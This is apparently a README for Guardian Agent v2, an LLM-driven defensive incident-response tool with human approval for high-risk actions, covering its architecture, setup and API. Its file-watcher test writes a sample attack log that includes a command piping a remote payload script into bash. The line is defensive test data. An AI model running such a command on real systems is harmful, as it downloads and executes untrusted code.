<div align="center">

# 🛡️ Guardian Agent v2

### *Autonomous AI-Powered Cybersecurity Incident Responder*

> Drop a log file. Get a full threat investigation, mitigation plan, and executed response — in under 90 seconds.

<br/>

![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
![FastAPI](https://img.shields.io/badge/FastAPI-009688?style=for-the-badge&logo=fastapi&logoColor=white)
![React](https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB)
![LangChain](https://img.shields.io/badge/LangChain-121212?style=for-the-badge&logo=chainlink&logoColor=white)
![SQLite](https://img.shields.io/badge/SQLite-07405E?style=for-the-badge&logo=sqlite&logoColor=white)
![Slack](https://img.shields.io/badge/Slack-4A154B?style=for-the-badge&logo=slack&logoColor=white)
![Okta](https://img.shields.io/badge/Okta-007DC1?style=for-the-badge&logo=okta&logoColor=white)
![Railway](https://img.shields.io/badge/Railway-0B0D0E?style=for-the-badge&logo=railway&logoColor=white)
![Vercel](https://img.shields.io/badge/Vercel-000000?style=for-the-badge&logo=vercel&logoColor=white)

<br/>

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
![Status](https://img.shields.io/badge/Status-Production%20Ready-brightgreen)
![LangGraph](https://img.shields.io/badge/LangGraph-Multi--Agent-blueviolet)
![VirusTotal](https://img.shields.io/badge/VirusTotal-70%2B%20AV%20Engines-red)

</div>

---

## 🎯 What Is This?

**Guardian Agent** is a production-grade autonomous SOC (Security Operations Center) analyst. It does in **76 seconds** what a human analyst takes **15–45 minutes** to do manually.

You feed it a security log. It:

1. 🔍 **Analyzes** the threat using an LLM — extracts risk score, attack type, and indicators
2. 🕵️ **Investigates** every IP and file hash against real threat intel databases
3. 🛡️ **Plans** a mitigation strategy with specific executable actions
4. 🧑‍💻 **Asks YOU** for approval when the risk is high enough to matter
5. ⚡ **Executes** — blocks IPs, disables accounts, isolates hosts
6. 📋 **Reports** — generates a professional PDF incident report
7. 📨 **Notifies** — sends Slack and email alerts automatically

This is the same architecture used by enterprise tools like **Palo Alto XSOAR** and **Splunk SOAR** — built from scratch.

---

## ⚡ Demo: 90-Second Threat Response

```
10:00:01  Attacker starts SSH brute force
10:00:47  backup_svc account compromised
10:00:49  Malware download begins from C2 server
          ↓
10:00:51  ← Guardian detects new log entry
10:00:53  ← ANALYZER: Risk 9/10, 4 IOCs extracted
10:00:55  ← INVESTIGATOR: AbuseIPDB confirms 185.220.101.47 malicious (98%)
10:00:56  ← INVESTIGATOR: VirusTotal — 66/76 AV engines flagged the hash
10:00:58  ← MITIGATOR: 5-action response plan ready
10:00:58  ← 🚨 Slack: "Approval Required — Risk 9/10"
10:01:15  ← YOU click Approve in the dashboard
10:01:16  ← Both IPs blocked on firewall
10:01:16  ← backup_svc account suspended in Okta
10:01:17  ← Server moved to quarantine VLAN
10:01:17  ← ✅ Slack: "Incident Complete — 5 actions executed"

Total time from attack to containment: 76 seconds.
```

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     GUARDIAN AGENT v2                        │
│                                                              │
│  ┌──────────┐    ┌──────────────────────────────────────┐   │
│  │  Log     │    │         LangGraph Pipeline            │   │
│  │  Sources │───▶│                                      │   │
│  │          │    │  ANALYZER → INVESTIGATOR → MITIGATOR │   │
│  │ • Manual │    │               ↓                      │   │
│  │ • Watcher│    │    HITL ── Human Approval ────────── │   │
│  │ • Cron   │    │               ↓                      │   │
│  └──────────┘    │  EXECUTOR → REPORT                   │   │
│                  └──────────────────┬───────────────────┘   │
│                                     │                        │
│  ┌──────────────┐    ┌──────────────▼─────────────────────┐ │
│  │ Threat Intel │    │         FastAPI Backend             │ │
│  │              │    │                                     │ │
│  │ • AbuseIPDB  │◀──▶│  REST API + WebSocket Streaming    │ │
│  │ • VirusTotal │    │  JWT Auth + SQLite Persistence      │ │
│  └──────────────┘    └──────────────┬─────────────────────┘ │
│                                     │                        │
│  ┌──────────────┐    ┌──────────────▼─────────────────────┐ │
│  │ Integrations │    │       React Dashboard               │ │
│  │              │    │                                     │ │
│  │ • Okta       │    │  Live Pipeline • HITL Approval      │ │
│  │ • Azure AD   │    │  PDF Export • Incident History      │ │
│  │ • Slack      │    │  Login Page • System State          │ │
│  │ • Email      │    └─────────────────────────────────────┘ │
│  └──────────────┘                                            │
└──────────────────────────────────────────────────────────────┘
```

---

## ✨ Features

### 🤖 AI Agent Pipeline
- **6-node LangGraph pipeline** — each node is a specialized AI agent
- **Groq LLM (Llama 3.3 70B)** — fast, accurate threat analysis in seconds
- **ReAct reasoning** — agent explains every decision in plain English
- **Idempotent execution** — won't double-block the same IP twice

### 🔍 Real Threat Intelligence
- **AbuseIPDB** — checks IPs against a database of 100M+ reported attacks
- **VirusTotal** — scans file hashes across 70+ antivirus engines simultaneously
- **URL scanning** — checks suspicious URLs against VirusTotal's URL database

### 🧑‍💻 Human-in-the-Loop (HITL)
- Agent **stops and waits** when risk score > 7
- Web-based **Approve / Deny** UI with full action preview
- Automatic execution resumes within 2 seconds of decision
- Low-risk incidents (≤ 7) execute automatically with no interruption

### 🌐 React Dashboard
- **Cyberpunk dark theme** with real-time pipeline visualization
- **WebSocket streaming** — watch each pipeline node complete live
- **Incident history** — full searchable audit trail
- **System State** — view all blocked IPs, hashes, and quarantined hosts
- **JWT Login** — secure authentication for the dashboard

### 📨 Notifications
- **Slack** — rich formatted alerts with direct links back to dashboard
- **Email** — dark-themed HTML incident reports via SMTP/Gmail
- **3 automated messages** per incident: created → approval needed → complete

### 📄 PDF Reports
- Professional incident report auto-generated per incident
- Includes IOC table, threat intel results, mitigation plan, executed actions, raw log
- Downloadable with one click from the dashboard

### ⏰ Automated Scanning
- **File Watcher** — drop a `.log` file, analysis begins instantly
- **Cron Scheduler** — scans a directory automatically at configurable intervals
- **Deduplication** — content-hashed, won't resubmit the same log twice

### 🔒 Enterprise Integrations
- **Okta** — suspend compromised user accounts via Lifecycle API
- **Azure AD** — disable users via Microsoft Graph API
- **Firewall** — IP blocking (JSON mock, swappable for Palo Alto/AWS SG API)

---

## 📁 Project Structure

```
guardian_agent_v2/
├── app/
│   ├── agent/
│   │   ├── graph.py           # LangGraph 6-node pipeline
│   │   ├── state.py           # AgentState TypedDict
│   │   └── prompts.py         # LLM system prompts
│   ├── api/
│   │   └── server.py          # FastAPI + WebSocket backend
│   ├── auth/
│   │   └── jwt_auth.py        # JWT authentication
│   ├── memory/
│   │   └── store.py           # SQLite incident persistence
│   ├── notifications/
│   │   └── notifier.py        # Slack + Email alerts
│   ├── reports/
│   │   └── generator.py       # PDF report generation (ReportLab)
│   ├── scheduler/
│   │   └── cron.py            # APScheduler auto-scanning
│   ├── tools/
│   │   ├── threat_intel.py    # AbuseIPDB + VirusTotal APIs
│   │   └── sys_actions.py     # Okta / Azure AD / mock actions
│   └── watcher/
│       └── watch.py           # Watchdog file watcher
├── frontend/
│   └── src/
│       ├── App.jsx            # Main app + routing + auth
│       ├── index.css          # Cyberpunk dark theme
│       ├── pages/
│       │   ├── Dashboard.jsx       # Incident list + live stats
│       │   ├── IncidentDetail.jsx  # Live view + approval UI + PDF
│       │   ├── Login.jsx           # JWT authentication page
│       │   ├── SubmitLog.jsx       # Manual log submission + presets
│       │   └── SystemState.jsx     # Firewall/blocklist/users viewer
│       ├── components/
│       │   └── IncidentRow.jsx
│       └── hooks/
│           └── useApi.js      # API hooks + WebSocket client
├── .env.example               # Environment variable template
├── requirements.txt
├── Procfile                   # Railway deployment
├── railway.json               # Railway service config
└── nixpacks.toml              # Build config
```

---

## 🚀 Quick Start

### Prerequisites

- Python 3.11+
- Node.js 18+
- [Groq API key](https://console.groq.com) — free
- [AbuseIPDB API key](https://www.abuseipdb.com/api) — free
- [VirusTotal API key](https://www.virustotal.com) — free

### 1. Clone & Install

```bash
git clone https://github.com/YOUR_USERNAME/guardian-agent-v2.git
cd guardian-agent-v2

# Python backend
python -m venv .venv
source .venv/Scripts/activate     # Windows
# source .venv/bin/activate       # Linux/macOS

pip install -r requirements.txt

# React frontend
cd frontend && npm install && cd ..
```

### 2. Configure Environment

```bash
cp .env.example .env
```

Open `.env` and fill in your keys:

```dotenv
GROQ_API_KEY=your_groq_api_key
ABUSEIPDB_API_KEY=your_abuseipdb_key
VIRUSTOTAL_API_KEY=your_virustotal_key
SLACK_ENABLED=true
SLACK_WEBHOOK_URL=https://hooks.slack.com/services/XXX/YYY/ZZZ
GUARDIAN_AUTH_ENABLED=true
GUARDIAN_ADMIN_USER=admin
GUARDIAN_ADMIN_PASS=your_strong_password
GUARDIAN_JWT_SECRET=your_long_random_secret
```

### 3. Run

Open **3 terminals**:

```bash
# Terminal 1 — Backend API
uvicorn app.api.server:app --reload --port 8000

# Terminal 2 — React Dashboard
cd frontend && npm start

# Terminal 3 — File Watcher (optional)
python -m app.watcher.watch --dir ./watched_logs
```

Open **http://localhost:3000** → log in → submit your first log 🎯

---

## 🧪 Testing

### Preset Attacks (Dashboard)
Go to **Submit Log** and choose:
| Preset | Risk | Description |
|--------|------|-------------|
| 🔴 Brute Force | 9/10 | SSH attack with account compromise |
| 🔴 Ransomware | 10/10 | Mass encryption + C2 communication |
| 🟠 Lateral Movement | 7/10 | Internal network reconnaissance |
| 🟡 Data Exfiltration | 6/10 | Large outbound data transfer |

### File Watcher Test
```bash
echo "Failed password for root from 185.220.101.47 port 54321
Accepted password for backup_svc from 185.220.101.47
backup_svc executed: curl http://194.165.16.11/payload.sh | bash" > watched_logs/attack.log
```

### Direct API Test
```bash
curl -X POST http://localhost:8000/api/incidents \
  -H "Content-Type: application/json" \
  -d '{"raw_log": "Failed login from 185.220.101.47", "log_source": "ssh"}'
```

---

## 🔌 API Reference

| Method | Endpoint | Description |
|--------|----------|-------------|
| `POST` | `/api/auth/login` | Login → JWT token |
| `GET` | `/api/stats` | Dashboard summary counts |
| `GET` | `/api/incidents` | List all incidents |
| `GET` | `/api/incidents/{id}` | Get single incident |
| `POST` | `/api/incidents` | Submit log for analysis |
| `POST` | `/api/incidents/{id}/approve` | Approve mitigation |
| `POST` | `/api/incidents/{id}/deny` | Deny mitigation |
| `GET` | `/api/incidents/{id}/report.pdf` | Download PDF report |
| `GET` | `/api/state` | Firewall/blocklist state |
| `GET` | `/api/scheduler/status` | Scheduler status |
| `POST` | `/api/scheduler/scan` | Trigger manual scan |
| `WS` | `/ws/incidents/{id}` | Live event stream |

Interactive docs: **http://localhost:8000/docs**

---

## ⚙️ Configuration Reference

| Variable | Description | Default |
|----------|-------------|---------|
| `GROQ_API_KEY` | Groq LLM API key | Required |
| `GROQ_MODEL` | Model name | `llama-3.3-70b-versatile` |
| `ABUSEIPDB_API_KEY` | AbuseIPDB key | Optional (mock fallback) |
| `VIRUSTOTAL_API_KEY` | VirusTotal key | Optional (mock fallback) |
| `SLACK_ENABLED` | Enable Slack alerts | `false` |
| `SLACK_WEBHOOK_URL` | Slack webhook URL | — |
| `EMAIL_ENABLED` | Enable email alerts | `false` |
| `EMAIL_SMTP_USER` | Gmail address | — |
| `EMAIL_SMTP_PASS` | Gmail app password | — |
| `EMAIL_TO` | Alert recipient | — |
| `GUARDIAN_AUTH_ENABLED` | Enable login page | `false` |
| `GUARDIAN_ADMIN_USER` | Dashboard username | `admin` |
| `GUARDIAN_ADMIN_PASS` | Dashboard password | `guardian123` |
| `GUARDIAN_JWT_SECRET` | JWT signing secret | **Change this!** |
| `SCHEDULER_ENABLED` | Enable auto-scanning | `false` |
| `SCHEDULER_INTERVAL_MINUTES` | Scan frequency | `60` |
| `OKTA_DOMAIN` | Okta org domain | Optional |
| `OKTA_API_TOKEN` | Okta SSWS token | Optional |
| `AZURE_TENANT_ID` | Azure AD tenant ID | Optional |
| `AZURE_CLIENT_ID` | Azure app client ID | Optional |
| `AZURE_CLIENT_SECRET` | Azure client secret | Optional |

---

## 🌐 Deployment

### Backend → Railway

```bash
# 1. Push to GitHub
git push origin main

# 2. Go to railway.app → New Project → Deploy from GitHub
# 3. Add all environment variables in Railway dashboard
# 4. Railway auto-deploys on every push ✅
```

### Frontend → Vercel

```bash
# 1. Go to vercel.com → New Project → Import repo
# 2. Set Root Directory to: frontend
# 3. Add env variable: REACT_APP_API_URL=https://your-backend.railway.app
# 4. Deploy ✅
```

---

## 🗺️ Roadmap

- [ ] Risk scoring history — track repeat offender IPs/hashes across incidents
- [ ] Multi-user dashboard — analyst / responder / admin roles
- [ ] Threat hunting — natural language search across all incidents
- [ ] SIEM integration — Splunk / Elastic log streaming
- [ ] CrowdStrike integration — real host isolation API
- [ ] Palo Alto firewall — real IP blocking via PAN-OS API
- [ ] Mobile push notifications

---

## 🧠 How It Works

### The LangGraph Pipeline

```python
ANALYZER      → extracts risk score, attack type, IOCs from raw log using LLM
     ↓
INVESTIGATOR  → queries AbuseIPDB + VirusTotal for every IOC found
     ↓
MITIGATOR     → LLM creates specific response action plan
     ↓
HITL          → pauses if risk > 7, waits for human approval via WebSocket
     ↓
EXECUTOR      → runs each action: block_ip / disable_user / isolate_host...
     ↓
REPORT        → saves to SQLite, generates PDF, sends Slack + email
```

### Why LangGraph Over Rules?

Traditional SIEM rules: `if source_ip in blocklist → alert`

Guardian: understands **context**, handles **novel attacks**, explains **reasoning**, processes **ambiguous logs** — because it uses a real language model, not pattern matching.

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

<div align="center">

Built with ❤️ by **Nauman Ali Shah**

*If this helped you, please give it a ⭐ — it means a lot!*

</div>
# updated
